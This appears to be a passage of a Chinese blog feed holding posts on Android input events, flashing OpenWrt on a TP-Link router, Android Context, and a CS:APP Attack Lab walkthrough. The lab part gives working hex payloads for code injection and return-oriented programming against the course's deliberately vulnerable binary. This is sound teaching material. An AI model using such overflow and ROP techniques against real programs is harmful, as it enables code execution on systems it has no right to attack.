Looper中进行监听，对返回的消息进行处理： 12345678910111213141516171819202122232425262728293031323334353637int Looper::addFd(int fd, int ident, int events, const sp&lt;LooperCallback&gt;&amp; callback, void* data) &#123; &#123; // acquire lock AutoMutex _l(mLock); Request request; request.fd = fd; request.ident = ident; request.events = events; request.seq = mNextRequestSeq++; request.callback = callback; request.data = data; if (mNextRequestSeq == -1) mNextRequestSeq = 0; // reserve sequence number -1 struct epoll_event eventItem; request.initEventItem(&amp;eventItem); ssize_t requestIndex = mRequests.indexOfKey(fd); if (requestIndex &lt; 0) &#123; int epollResult = epoll_ctl(mEpollFd, EPOLL_CTL_ADD, fd, &amp; eventItem); if (epollResult &lt; 0) &#123; ALOGE(\"Error adding epoll events for fd %d: %s\", fd, strerror(errno)); return -1; &#125; mRequests.add(fd, request); &#125; else &#123; int epollResult = epoll_ctl(mEpollFd, EPOLL_CTL_MOD, fd, &amp; eventItem); if (epollResult &lt; 0) &#123; if (errno == ENOENT) &#123; epollResult = epoll_ctl(mEpollFd, EPOLL_CTL_ADD, fd, &amp; eventItem); ... ... &#125; ... &#125; &#125;&#125; 这里将NativeInputEventReceiver传入的this作为callback存入到request中， 再以fd为索引向mRequests映射表中加入request，然后以fd作为信号调用epoll_ctl系统调用，利用它对通信过程进行监听，在收到消息之后最终会根据fd找到mRequests中的request保存的callback，即NativeInputEventReceiver对象。 关于addFd方法的详细分析，可以查看Native消息机制的博文 小结现在我们了解了从内核到应用整个触摸事件的传输过程，并且知道了InputChannel在两端的监听建立与触发的函数，至此，触摸事件已经从系统底层来到了我们的应用进程，下一篇博客将从触发函数开始讲解事件从native层真正传入java层的过程。","tags":[{"name":"Android","slug":"Android","permalink":"https://www.viseator.com/tags/Android/"},{"name":"View","slug":"View","permalink":"https://www.viseator.com/tags/View/"}]},{"title":"TP-Link mr12u-v1刷openwrt+mentohust交叉编译（附文件下载）","date":"2017-09-05T12:06:16.000Z","path":"2017/09/05/mr12u_openwrt_mentohust/","text":"写在前面开学学校启用了有线网，由于校园网存在只能单一设备登陆的限制与无线登陆限速，所以想通过路由器刷openwrt再使用mentohust进行校园网的锐捷认证来实现多设备与不限速使用。 在选择路由器时考虑了如下因素： 可刷openwrt：只有特定的处理器支持openwrt，支持的路由器型号在官网有一个列表，直接参照这个列表选就可以了。 有电源/usb供电：在寝室使用的话因为有段时间断电但不断网，所以需要自带电源或可用移动电源usb供电。 性价比高：因为只用于转发校园网，所以可以买便宜一些的。 最终选择了TP-Link mr12u这款路由器，在闲鱼上找了一家同城二手的，45元人民币拿下。 注意下面需要在linux终端环境下操作 刷不死Boot由于路由器固件的特殊性，一旦刷崩了或者设置错误导致无法正常登陆路由器，那么就无法对路由器进行管理，也就是所谓的变砖。 不死boot的作用就是在这种情况下提供进路由设置重新刷固件的机会。 刷解锁固件由于U-Boot分区默认是锁定的，所以无法刷入新的boot。因此我们要先刷入一个修改过的解锁U-Boot分区的固件，这个修改过的固件可以在百度网盘下载，另外由于我手上的这个是v1版本的，与v2版本的硬件不同，所以需要使用的是mr11u-v2的解锁固件（即openwr-ar71xx-generic-tl-mr11u-v2-squashfs-factory.bin）。下载完以后先长按复位键复位路由器，连接上以后直接进入192.168.1.1 TP-Link默认的管理界面，在下图这里选择刚下好的固件刷入即可： （图源网络） 刷不死boot先下载不死boot： http://viseator.com/file/breed-ar9331-mr12u.bin 路由器自动重启以后使用网线连接电脑与路由器，先用浏览器登陆192.168.1.1，用户名为root密码为空，然后设置ssh密码并保存。 现在就可以使用ssh用root与刚刚设置的密码登陆路由器了： 1ssh root@192.168.1.1 登陆以后先查看并记下mac地址，之后要用到： 1ifconfig eth0 图片来源 然后exit退出ssh，使用scp命令传送下载好的boot包： 1scp breed-ar9331-mr12u.bin root@192.168.1.1:/tmp/ 再次登陆路由器，刷入U-Boot： 123ssh root@192.168.1.1cd &#x2F;tmpmtd write breed-ar9331-mr12u.bin u-boot 等待命令返回后直接将路由器关机。 想要进入不死boot，只需按住reset复位键不放，再开机，等待个十几秒后松开，再有线连接电脑与路由器，浏览器输入192.168.1.1就可以进入管理界面了，以后变砖了只要这样都可以重新刷固件，所以称不死。 进入不死boot以后，先进入下图界面设置之前记录的mac地址： 图片来源 刷入最新固件（可选）下面就可以直接在不死boot里面选择固件更新刷入最新的固件了，最新固件的下载可以到这里找到。 但是mr12u的闪存只有可怜的4m，如果安装最新的openwrt就没有空间放下mentohust了，所以还不如就直接用这个解锁用的固件。 交叉编译mentohust在网上找了一圈愣是没找到ar71xx处理器已经编译好的mentohust，只能选择自己交叉编译了。没有条件自己编译的可以使用我编译好的只适用于ar71xx处理器的mentohust: http://www.viseator.com/file/mentohust 。 依赖包的安装可以到https://wiki.openwrt.org/zh-cn/doc/howto/buildroot.exigence 根据自己的发行版安装必要的软件包。 下载编译工具链首先到https://downloads.openwrt.org/snapshots/trunk/ar71xx/generic/ 页面下载 OpenWrt-SDK-ar71xx-generic_gcc-5.3.0_musl-1.1.16.Linux-x86_64.tar.bz2 处理器SDK，解压后进入目录下的./staging_dir/toolchain-mips_34kc_gcc-5.3.0_musl-1.1.16/bin。 配置环境变量12345678export PATH=$PATH:到上述/staging_dir/toolchain-mips_34kc_gcc-5.3.0_musl-1.1.16/bin 目录的完整路径export CC=mipsel-openwrt-linux-gcc export CPP=mipsel-openwrt-linux-cpp export GCC=mipsel-openwrt-linux-gcc export CXX=mipsel-openwrt-linux-g++ export RANLIB=mipsel-openwrt-linux-uclibc-ranlibexport LDFLAGS=\"-static\" export CFLAGS=\"-Os -s\" 编译libpcap动态链接库到 http://www.tcpdump.org/ 下载libpcap-1.8.1.tar.gz，解压以后进入目录，执行： 1./configure --host=mipsel-openwrt-linux --prefix=自已设定路径/ --with-pcap=linux 然后执行： 1make 会报错误，但是不影响我们需要的libpcap.a文件，在当前目录下找到这个文件复制出来备用。 编译mentohust克隆mentohust源码： 1git clone https://github.com/hyrathb/mentohust 进入目录，首先生成configure： 1sh autogen.sh 然后配置： 1./configure --host=mipsel-openwrt-linux --disable-encodepass --disable-notify --prefix=自设目录 --with-pcap=前面保存的libpcap.a文件路径 编译： 1make 成功以后就可以在src目录下找到编译好的mentohust文件了。 部署我们把编译好的文件传送到路由器中： 1scp mentohust root@192.168.1.1:/root 安装libpcap路由器中默认没有我们依赖的libpcap库，我们要手动安装，先下载： http://www.viseator.com/file/libpcap_1.0.0-2_ar71xx.ipk 然后传送到路由器中： 1scp libpcap_1.0.0-2_ar71xx.ipk root@192.168.1.1:/tmp 下面登陆路由器，进入/tmp目录，执行： 1opkg install libpcap_1.0.0-2_ar71xx.ipk 新建wifi与桥接配置新刷的路由器只有一个默认接入点，我们先到路由器管理界面修改接入点。增加访问密码等等。这一步的配置就不多说了网上都有。 由于这个路由器只有一个接口，我们现在是将它作为lan口在用的，但是实际上我们需要使用它作为wan口来连接校园网认证上网，并且要将lan口与wifi进行桥接使得我们依旧可以通过192.168.1.1这个地址来管理路由器。 这步操作需要直接修改/etc/config/network文件，如果使用图形界面配置可能会导致变砖。 我们登陆路由器以后直接用vim修改上述文件： 1vim /etc/config/network 下面提供我找到的示例文件供参考：出处 123456789101112131415161718config interface &#39;loopback&#39; option ifname &#39;lo&#39; option proto &#39;static&#39; option ipaddr &#39;127.0.0.1&#39; option netmask &#39;255.0.0.0&#39;config interface &#39;lan&#39; option type &#39;bridge&#39; option proto &#39;static&#39; option ipaddr &#39;192.168.1.1&#39; option netmask &#39;255.255.255.0&#39;config interface &#39;wan&#39; option ifname &#39;eth0&#39; option _orig_ifname &#39;eth0&#39; option _orig_bridge &#39;false&#39; option proto &#39;dhcp&#39; option macaddr &#39;xx:xx:xx:xx:xx:xx&#39;替换为自己的mac 修改后保存，然后reboot重启。 现在就不能通过有线来管理路由器了，因为管理地址已经桥接到了无线上了。所以我们要使用无线连接，有线接校园网，然后登陆到路由器。 找到我们存放mentohust的/root目录（默认就是），启动mentohust: 1./mentohust -u username -p password -n eth0 如果要后台运行加个-b1就可以了。 如果一切正常的话现在无线就可以正常上网了。","tags":[{"name":"openwrt","slug":"openwrt","permalink":"https://www.viseator.com/tags/openwrt/"}]},{"title":"Android Context理解与陷阱","date":"2017-07-19T11:07:42.000Z","path":"2017/07/19/android_context/","text":"Context?Context在安卓开发时是一个非常常见的组件，我们会在许多地方使用它，举一些例子： 启动新的Activity Service 发送广播，接收广播 填充View 获取资源 相信每一个开发者在看见它时都有过这样一些疑问： Context是什么 Context的作用 Context从哪里来 同时，我们也经历过需要一个Context但不知道如何去正确获取/传递的情况，事实上不正确地保存一个Context的引用可能会导致部分内存不能被正确GC从而造成事实上的内存泄漏。 本文将着重对上面这些内容进行讲解。 Context的定义字面上解释，Context意为“环境”，这个解释比较符合它的作用。 官方文档中对Context的解释是： Interface to global information about an application environment. This is an abstract class whose implementation is provided by the Android system. It allows access to application-specific resources and classes, as well as up-calls for application-level operations such as launching activities, broadcasting and receiving intents, etc. 关于应用环境的全局信息的接口。它是一个抽象类，具体由安卓系统来实现。它允许我们去访问特定的应用的资源和类，同时也可以经由它去向上请求应用级别的操作例如启动Activity、发送广播、接收intents等等。 我们可以把它看作是一个连接我们代码与安卓系统的“桥梁”，我们开发的应用是与运行在设备上的操作系统紧密相关的，只能通过操作系统，我们才能去启动一个新的Activity，向其他应用发送广播，启动一个新的Service或是访问我们存放在apk中的资源文件。 Context就是系统为我们提供上述功能的一个接口，我们需要使用它去完成与系统的信息交换。 Context从哪里来Context作为一个依赖于系统的类，SDK中只给了我们一个抽象类，具体的实现由系统完成，下文举例使用的ContextImpl就是AOSP中安卓源码对于Context的一个实现。 Context的作用Context中封装的信息我们可以看看Context里面包含了哪些东西（部分）。 12345678910111213141516171819private final String mBasePackageName; private final String mOpPackageName; //软件包名private final Resources mResources;private final ResourcesManager mResourcesManager; //用于管理资源文件private final Display mDisplay; //为View填充等提供屏幕尺寸、像素密度等信息private final DisplayAdjustments mDisplayAdjustments = new DisplayAdjustments();private Resources.Theme mTheme = null; //主题信息private File mCacheDir;@GuardedBy(\"mSync\")private File mCodeCacheDir;...@GuardedBy(\"mSync\")private File[] mExternalObbDirs;@GuardedBy(\"mSync\")private File[] mExternalFilesDirs;@GuardedBy(\"mSync\")private File[] mExternalCacheDirs;@GuardedBy(\"mSync\")private File[] mExternalMediaDirs; //各种文件路径 这些域的存在为功能提供了必要的信息，例如在LayoutInflater填充View时需要一个context作为参数，我们查看这个context如何被使用： 1final XmlResourceParser childParser = context.getResources().getLayout(layout); 我们传入的ResourceId最终会被通过context的getResource()方法获取的Resource对象的getLayout()方法定位到对应的xml文件提供给Inflater进行解析。 123456789// Apply a theme wrapper, if allowed and one is specified.if (!ignoreThemeAttr) &#123; final TypedArray ta = context.obtainStyledAttributes(attrs, ATTRS_THEME); final int themeResId = ta.getResourceId(0, 0); if (themeResId != 0) &#123; context = new ContextThemeWrapper(context, themeResId); &#125; ta.recycle();&#125; 在这里调用了context的obtainStyledAttributes()方法： 1234public final TypedArray obtainStyledAttributes( AttributeSet set, @StyleableRes int[] attrs) &#123; return getTheme().obtainStyledAttributes(set, attrs, 0, 0);&#125; 最终使用了context中存放的主题信息为填充的view设置属性。 现在我们知道，我们存放在res文件夹下的内容（布局文件、字符串文件、图片、主题……）都需要通过一个context去向系统获取。 那么为什么在启动activity、启动service、发送广播时都需要使用context呢？因为这些操作与系统是紧密相关的，我们知道启动这些东西都需要使用一个叫intent的东西（关于intent的内容会在另外的文章讲），以startActivity()方法为例，我们一路向上追溯，可以发现启动activity最终是由AcitivityManagerNative.getDefault()的本地方法startActivity()执行的： 12345678910try &#123; intent.migrateExtraStreamToClipData(); intent.prepareToLeaveProcess(); int result = ActivityManagerNative.getDefault().startActivity( whoThread, who.getBasePackageName(), intent, intent.resolveTypeIfNeeded(who.getContentResolver()), token, target != null ? target.mEmbeddedID : null, requestCode, 0, null, options); checkStartActivityResult(result, intent);&#125; catch (RemoteException e) &#123;&#125; 这个时候我们发现，传入的context已经变成了上面代码中的who，利用这个 context获取了包名与方法的第四个参数who.getContentResolver()。它的作用是提供信息来解析intent的MIME type，帮助系统决定intent的目标。 可以看到context在这里同样起到了一个提供必要信息的作用。 Context的作用在这里再重复一遍上面说过的话，配合之前的例子，是不是可以更好地理解了呢？ 我们可以把它看作是一个连接我们代码与安卓系统的“桥梁”，我们开发的应用是与运行在设备上的操作系统紧密相关的，只能通过操作系统，我们才能去启动一个新的Activity，向其他应用发送广播，启动一个新的Service或是访问我们存放在apk中的资源文件。 Context就是系统为我们提供上述功能的一个接口，我们需要使用它去完成与系统的信息交换。 Context的使用Context分类Context并不是都是相同的，根据获取方式的不同，我们得到的Context的各类也有所不同。 Activity/Service我们知道Acitivity类继承自ContextThemeWrapper，ContextThemeWrapper继承自ContextWrapper，最后ContextWrapper继承自Context。顾名思义，ContextWrapper与ContextThemeWrapper只是将Context进行了再次的包装，加入了更多的信息，同时对一些方法做了转发。 所以我们在Activity或Service中需要Context时就可以直接使用this，因为它们本身就是Context。 当系统创建一个新的Activity/Service实例时，它也会创建一个新的ContextImpl实例来封装所有的信息。 对于每一个Activity/Service实例，它们的基础Context都是独立的。 ApplicationApplication同样继承于ContextWrapper，但是Application本身是以单例模式运行在应用进程中的，它可以被任何Activity/Service用getApplication()或是被任何Context使用getApplicationContext()方法获取。 不管使用什么方法去获取Application，获取的总是同一个Application实例。 BroadcastReciverBroadcastReciver本身并不是一个Context或在内部保存了一个Context，但是系统会在每次调用其onRecive()方法时向它传递一个Context对象，这个Context对象是一个ReceiverRestrictedContext（接收器限定Context），与普通Context不同在它的registerReceiver()与bindSerivce()方法是被禁止使用的，这意味着我们不能在onRecive()方法中调用该Context的这两个方法。 每次调用onReceive()方法传递的Context都是全新的。 ContentProvider它本身同样不是一个Context，但它在创建时会被赋予一个Context并可以通过getContext()方法获取。 如果这个内容提供器运行在调用它的应用中，将会返回该应用的Application单例，如果它是由其他应用提供的，返回的Context将会是一个新创建的表示其他应用环境的Context。 使用Context时的陷阱现在我们知道Context的几种分类，其实上面的分类也就是我们获取它的方式。着重标出的内容说明了它们被提供的来源，也暗指了它们的生命周期。 我们常常会在类中保存对Context的引用，但是我们要考虑生命周期的问题：如果被引用的这个Context是一个Acitivity，如果存放这个引用的类的生命周期大于Activity的生命周期，那么Activity在停止使用之后还被这个类引用着，就会引致无法被GC，造成事实上的内存泄露。 举一个例子，如果使用下面的一个单例来保存Context的引用来加载资源： 1234567891011121314151617public class CustomManager &#123; private static CustomManager sInstance; public static CustomManager getInstance(Context context) &#123; if (sInstance == null) &#123; sInstance = new CustomManager(context); &#125; return sInstance; &#125; private Context mContext; private CustomManager(Context context) &#123; mContext = context; &#125;&#125; 这段程序的问题在于不知道传入的Context会是什么类型的，可能在初始化的时候传入的是一个Activity/Serivce，那么几乎可以肯定的是，这个Activity/Service将不会在结束以后被垃圾回收。如果是一个Activity，那么这意味着与它相关联的View或是其他庞大的类都将留在内存中而不会被回收。 为了避免这样的问题，我们可以改正这个单例： 123456789101112131415161718public class CustomManager &#123; private static CustomManager sInstance; public static CustomManager getInstance(Context context) &#123; if (sInstance == null) &#123; //Always pass in the Application Context sInstance = new CustomManager(context.getApplicationContext()); &#125; return sInstance; &#125; private Context mContext; private CustomManager(Context context) &#123; mContext = context; &#125;&#125; 我们只修改了一处，第7行中我们使用context.getApplicationContext()这个方法来获取Application这个单例，而不是直接保存context本身，这样就可以保证不会出现某context因为被这个单例引用而不能回收的情况。而Application本身是单例这个特性保证了生命周期的一致，不会造成内存的浪费。 为什么不总是使用application作为context既然它是一个单例，那么我们为什么不直接在任何地方都只使用它呢？ 这是因为各种context的能力有所不同： （图片出处见文末） 对几个注解的地方作说明： 一个application可以启动一个activity，但是需要新建一个task，在特殊情况下可以这么做，但是这不是一个好的行为因为这会导致一个不寻常的返回栈。 虽然这是合法的，但是会导致填充出来的view使用系统默认的主题而不是我们设置的主题。 如果接收器是null的话是被允许的，通常在4.2及以上的版本中用来获取一个粘性广播的当前值。 我们可以发现与UI有关的操作除activity之外都不能完成，在其他地方这些context能做的事情都差不多。 但是我们回过头来想，这三个与UI相关的操作一般都不会在一个activity之外进行，这个特性很大程度上就是系统为我们设计成这样的，如果我们试图去用一个Application去显示一个dialog就会导致异常的抛出和应用的崩溃。 对上面的第二点再进一步解释，虽然我们可以使用application作为context去填充一个view，但是这样填充出的view使用的将会是系统默认的主题，这是因为只有acitivity中才会存有我们定义在manifest中的主题信息，其他的context将会使用默认的主题去填充view。 如何使用正确的Context既然我们不能将Activity作为context保存在另外一个比该Activity生命周期长的类中，那么如果我们需要在这个类中完成与UI有关的操作（比如显示一个dialog）该怎么办？ 如果真的遇到了这样的情况：我们不得不保存一个activity在一个比该Activity生命周期长的类中以进行UI操作，就说明我们的设计是有问题的，系统的设计决定了我们不应该去进行这样的操作。 所以我们可以得出结论： 我们应该在Activity/Service的生命周期范围内直接使用该Activity/Service作为context，在它们的范围之外的类，应该使用Application单例这个context（并且不应该出现UI操作）。 Referencehttps://possiblemobile.com/2013/06/context/ https://web.archive.org/web/20170621005334/http://levinotik.tumblr.com/post/15783237959/demystifying-context-in-android http://grepcode.com/file/repository.grepcode.com/java/ext/com.google.android/android/5.1.1_r1/android/app/ContextImpl.java?av=f","tags":[{"name":"Android","slug":"Android","permalink":"https://www.viseator.com/tags/Android/"}]},{"title":"深入理解计算机系统（CS:APP) - Attack Lab详解","date":"2017-07-18T05:47:01.000Z","path":"2017/07/18/CS_APP_AttackLab/","text":"Attack Lab实验代码见GitHub 简介Attack Lab的内容针对的是CS-APP中第三章中关于程序安全性描述中的栈溢出攻击。在这个Lab中，我们需要针对不同的目的编写攻击字符串来填充一个有漏洞的程序的栈来达到执行攻击代码的目的，攻击方式分为代码注入攻击与返回导向编程攻击。本实验也是对旧版本中IA32编写的Buffer Lab的替代。 我们可以从CMU的lab主页来获取自学者版本与实验讲义(Writeup)，讲义中包含了必要的提示、建议与被禁止的操作，从这个lab开始之后的lab对讲义中内容的依赖还是很强的。 特别提示 本lab的自学者版本需要在运行程序时加上-q参数来避免程序向不存在的评分服务器提交我们的答案导致报错 前置讲义中首先给我们展示了导致程序漏洞的关键：getbuf函数。 123456unsigned getbuf()&#123; char buf[BUFFER_SIZE]; Gets(buf); return 1;&#125; getbuf函数在栈中申请了一块BUFFER_SIZE大小的空间，然后利用这块空间首地址作为Gets函数的参数来从标准输入流中读取字符。由于没有对读入字符数量的检查，我们可以通过提供一个超过BUFFER_SIZE的字符串来向getbuf的栈帧之外写入数据。 在代码注入攻击中就是利用函数返回时RET指令会将调用方在栈中存放的返回地址读入IP中，执行该地址指向的代码。栈溢出后，我们可以改写这个返回地址，指向我们同样存放在栈中的指令，以达到攻击的目的。 第一部分：代码注入攻击Level１在这个等级中，我们不需要注入任何攻击代码，只需要更改getbuf函数的返回地址执行指定的函数touch1（该函数已经存在于程序中）。 那么我们需要做的就是将栈中存放返回地址的位置改为touch1函数的入口地址，问题在于我们如何将地址精确地写入到原来的地址的位置。 讲义给出了getbuf的调用函数： 123456void test()&#123; int val; val = getbuf(); printf(\"No exploit. Getbuf returned 0x%x\\n\", val);&#125; 如果攻击成功，我们不会执行到第五行，而是跳转到touch1中执行： 1234567void touch1()&#123; vlevel = 1; /* Part of validation protocol */ printf(\"Touch1!: You called touch1()\\n\"); validate(1); exit(0);&#125; 输出上面的字符串代表我们攻击成功。 下面我们利用objdump -d命令将程序反汇编来查看getbuf函数的行为。 12345678900000000004017a8 &lt;getbuf&gt;: 4017a8: 48 83 ec 28 sub $0x28,%rsp 4017ac: 48 89 e7 mov %rsp,%rdi 4017af: e8 8c 02 00 00 callq 401a40 &lt;Gets&gt; 4017b4: b8 01 00 00 00 mov $0x1,%eax 4017b9: 48 83 c4 28 add $0x28,%rsp 4017bd: c3 retq 4017be: 90 nop 4017bf: 90 nop 代码比较简单，在第2行中将rsp减了0x28，申请了一块28字节的空间，第3行将rsp赋给rdi就是空间的首地址，然后调用了Gets函数，rdi就是它的参数。到这里我们可以确定BUFFER_SIZE的大小为0x28（自学讲义中这个值是固定的，但是真正的实验中这个值是由服务器生成的）。换句话说，在0x28字节的栈被Gets函数写满之后，多出来的字符会被写入getbuf函数的栈外。我们用图来说明栈的结构： 下面是低地址，上面是高地址，在getbuf函数申请的0x28字节内存之外的8个字节存放的就是test函数call指令后下一条指令的地址。 现在我们可以知道，我们需要用0x28字节来将栈填满，再写入touch1函数的入口地址，在getbuf函数执行到ret指令的时候就会返回到touch1中执行。 下面就要利用官方提供的hex2raw程序来帮助我们生成攻击字符串，这个程序将以空白字符隔开表示的字节转换成真正的二进制字节，注意这个程序只是原样地转换文件中的字符，所以字节序的问题是我们应该考虑的。 最终的答案如下： 12345600 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 可以看到前0x28个字节都使用0x00来填充，然后在溢出的8个字节中写入了touch1的首地址0x4017c0，注意字节序就可以了。 Level 2这个等级中我们同样需要跳转到指定的函数touch2中，但是想要通过touch2需要我们进行一些操作，讲义中给出了touch2的代码： 1234567891011void touch2(unsigned val) &#123; vlevel = 2; /* Part of validation protocol */ if (val == cookie) &#123; printf(\"Touch2!: You called touch2(0x%.8x)\\n\", val); validate(2); &#125; else &#123; printf(\"Misfire: You called touch2(0x%.8x)\\n\", val); fail(2); &#125; exit(0);&#125; 这里cookie是服务器给我们的一个数值，存放在cookie.txt文件中，自学者材料中的这个值应该都是一样的。 可以看到touch2拥有一个参数，只有这个参数与cookie的值相等才可以通过这一等级。所以我们的目标就是让程序去执行我们的代码，设置这个参数的值，再调用touch2完成攻击。 首先要注意的是touch2的第一个参数存放在寄存器rdi中，我们就是要设置这个寄存器的值为cookie。 那么如何让程序去执行我们的代码呢？既然我们可以向栈中写入任意内容并且可以设置返回时跳转到的地址，那么我们就可以通过在栈中写入指令，再令从getbuf函数返回的地址为我们栈中指令的首地址，在指令中执行ret进行第二次返回，返回到touch2函数，就可以实现我们的目的。 所以我决定将指令写入到栈地址的最低处，然后在溢出后将地址设置为这个栈地址。我们能完成这个攻击的前提是讲义中已经告诉我们这个具有漏洞的程序在运行时的栈地址是固定的，不会因运行多次而改变，并且这个程序允许执行栈中的代码。 我们利用gdb在运行时查看栈地址： 停在getbuf的这里，然后查看rsp指向的地址： 可以看到首地址为0x5561dc78，顺便看到第6行也就是0x28个字节之后存放的原返回地址。 由于我们需要在注入的代码中再次返回，就需要将二次返回的地址同样存放在栈中，这里为了避免与我们注入的代码重叠，我选择将touch2地址放在getbuf函数栈的最后8字节中。 下面就要生成攻击字符串了，首先我们需要生成攻击代码。我们先将攻击代码用汇编指令的形式写出来： 123movq $0x59b997fa,%rdi # rdi &#x3D; cookiemovq $0x5561dc98,%rsp # 将rsp设为存放在栈中的touch2地址的地址ret # 读取rsp指向的地址并跳转 下面利用gcc -c命令将汇编语句编译成机器码，再objdump -d生成的文件就可以间接地看到最终的机器码。 将指令的机器码作为我们攻击字符串的开头，touch2的地址放在栈中第0x20-0x28位置，将栈的首地址放在栈外的8个字节，构成我们的攻击字符串： 12345648 c7 c7 fa 97 b9 59 48 c7 c4 98 dc 61 55 c3 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ec 17 40 00 00 00 00 0078 dc 61 55 00 00 00 00 Level 3该等级同样让我们跳转到touch3函数中，不过touch3函数判断有所不同： 1234567891011121314151617181920/* Compare string to hex represention of unsigned value */int hexmatch(unsigned val, char *sval) &#123; char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, \"%.8x\", val); return strncmp(sval, s, 9) == 0;&#125;void touch3(char *sval) &#123; vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) &#123; printf(\"Touch3!: You called touch3(\\\"%s\\\")\\n\", sval); validate(3); &#125; else &#123; printf(\"Misfire: You called touch3(\\\"%s\\\")\\n\", sval); fail(3); &#125; exit(0);&#125; 仔细阅读上面的代码，我们需要传入touch3的参数是一个字符串的首地址，这个地址指向的字符串需要与cookie的字符串表示相同。这里cookie的字符串表示是cookie:0x59b997fa的ASCII表示的字符串：35 39 62 39 39 37 66 61 00。 所以我们需要做的是将这串字符串放入栈中，并且将rdi的值置为字符串的首地址，再进行与上步类似的二次返回操作。 这里我们需要好好考虑目标字符串在栈中的位置，下面是最终结果中的栈结构，先放出来便于讲解。 如果目标字符串存放的位置比touch3存放地址更低，在最终字符串对比的时候会发现rdi指向地址的内容发生了改变。分析原因，我们可以查看从getbuf返回到字符串比对过程中执行的指令： 12345600000000004018fa &lt;touch3&gt;: 4018fa: 53 push %rbx . . . 401911: e8 36 ff ff ff callq 40184c &lt;hexmatch&gt; 1234000000000040184c &lt;hexmatch&gt;: 40184c: 41 54 push %r12 40184e: 55 push %rbp 40184f: 53 push %rbx 上面列出的这部分指令都会向栈中压入新的内容，由于栈向下增长，而rsp一开始的位置在touch3地址的下一个位置，压入的新内容会覆盖touch3地址以下的内容，如果把目标字符串放在这部分会导致内容在比较之前就被覆盖。 知道栈中应该存放的内容的结构，攻击字符串的编写就不再困难了： 12345648 c7 c7 90 dc 61 55 48 # mov $0x5561dc90,%rdi mov $0x5561dc88,%rsp ret 为寄存器赋值并返回c7 c4 88 dc 61 55 c3 00fa 18 40 00 00 00 00 00 # touch3地址35 39 62 39 39 37 66 61 # 目标字符串00 00 00 00 00 00 00 0078 dc 61 55 00 00 00 00 # 注入指令首地址 第二部分：返回导向编程攻击我们在第二部分中需要解决的同样是第一部分的后两个问题，只不过我们要采取不同的方式来进行攻击。 为什么我们之前采取的代码注入的攻击手段无法在这个程序中起作用呢？这是国因为这个程序对代码注入攻击采取了两种防护方式： 栈随机化，使得程序每次运行时栈的地址都不相同，我们无法得知我们注入的攻击代码的地址，也无法在攻击代码中硬编码栈中的地址。 标记内存中的栈段为不可执行，这意味着注入在栈中的代码无法被程序执行。 尽管这两种手段有效地避免了代码注入攻击，但是我们仍然可以找到方式让程序执行我们想要去执行的指令。 攻击方式现在我们无法使用栈来存放代码，但是我们仍可以设置栈中的内容。不能注入代码去执行，我们还可以利用程序中原有的代码，利用ret指令跳转的特性，去执行程序中已经存在的指令。具体的方式如下： 我们可以在程序的汇编代码中找到这样的代码： 1230000000000400f15 &lt;setval_210&gt;:400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)400f1b: c3 retq 这段代码的本意是 1234void setval_210(unsigned *p)&#123; *p = 3347663060U;&#125; 这样一个函数，但是通过观察我们可以发现，汇编代码的最后部分：48 89 c7 c3又可以代表 12movq %rax, %rdiret 这两条指令（指令的编码可以见讲义中的附录）。 第1行的movq指令可以作为攻击代码的一部分来使用，那么我们怎么去执行这个代码呢？我们知道这个函数的入口地址是0x400f15，这个地址也是这条指令的地址。我们可以通过计算得出48 89 c7 c3这条指令的首地址是0x400f18，我们只要把这个地址存放在栈中，在执行ret指令的时候就会跳转到这个地址，执行48 89 c7 c3编码的指令。同时，我们可以注意到这个指令的最后是c3编码的是ret指令，利用这一点，我们就可以把多个这样的指令地址依次放在栈中，每次ret之后就会去执行栈中存放的下一个地址指向的指令，只要合理地放置这些地址，我们就可以执行我们想要执行的命令从而达到攻击的目的。 这样的一串以ret结尾的指令，被称为gadget。我们要攻击的程序中为我们设置了一个gadget_farm，为我们提供了一系列这样可以执行的攻击指令，同时我们也只被允许使用程序中start_farm与end_farm函数标识之间的gadget来构建我们的攻击字符串。 这种攻击方式被称为返回导向编程攻击。 Level 2目的与之前的Level 2相同，我们需要为rdi赋上cookie值，再跳转到touch2函数执行，跳转到touch2只需要将touch2的入口地址放在最后一个gadget之后，在它的ret指令执行之后就会返回到touch2中。 下面就要利用已有的gadget为rdi赋上我们想要的值。这里我们要将一个特定的值写入rdi，但是我们只可以使用栈来存放这个数值，同时不知道栈的地址，这个时候我们可以想到使用pop指令令这个值从栈中弹出到寄存器中。 查看gadget中提供的我们可以执行指令。发现 12300000000004019a7 &lt;addval_219&gt;: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 retq 中最后的字节为58 90 c3，这个三个字节分别编码了三条指令： 123popq %raxnopret 这个nop在这里当然不影响，利用这个pop指令我们就可以把栈中存放的内容弹出到rax中。接下来我们需要的是 1movq %rax,%rdi 这条指令，如果没有的话可以多传几次，正好我们发现了 12300000000004019c3 &lt;setval_426&gt;: 4019c3: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 4019c9: c3 retq 中最后的字节48 89 c7 90 c3编码了这样的指令。 我们分别计算这些需要执行的gadget的指令地址，写成攻击字符串： 12345678900 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 # 前0x28个字符填充0x00ab 19 40 00 00 00 00 00 # popq %rax fa 97 b9 59 00 00 00 00 # cookie （popq的目标）a2 19 40 00 00 00 00 00 # movq %rax,%rdiec 17 40 00 00 00 00 00 # 返回到 touch2 Level 3攻击目标与之前的Level 3相同，需要将rdi指向cookie的字符串表示的首地址。 目标字符串毫无疑问还是存放在栈中的，但是我们如何在栈地址随机化的情况下去获取我们放在栈中的字符串的首地址呢？ 查看gadget_farm中提供的gadget后，我们可以发现可以执行的命令中有 12movq %rsp,%raxret 这样一条，可以保存当前的rsp值，但是我们面临一个问题，这条命令执行时rsp的值为下一个地址，如果下一个地址中存放了目标字符串，那么命令就无法继续执行下去，也无法进入touch3函数了。 除此之外，似乎没有别的gadget可以帮助我们获取rsp的地址了。 我在这个地方卡了好几个小时，最后在别人的提示下才发现gadget_farm中有这样一个gadget画风与其他的不太一样： 12300000000004019d6 